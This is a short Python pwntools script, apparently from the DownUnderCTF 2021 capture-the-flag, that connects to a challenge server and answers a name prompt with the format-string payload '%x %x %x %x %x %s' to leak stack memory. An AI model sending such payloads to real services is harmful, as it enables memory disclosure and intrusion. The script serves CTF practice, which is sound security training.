from pwn import *

p = remote("pwn-2021.duc.tf", 31916)
p.recvuntil("name?")
p.sendline("%x %x %x %x %x %s")

p.recv()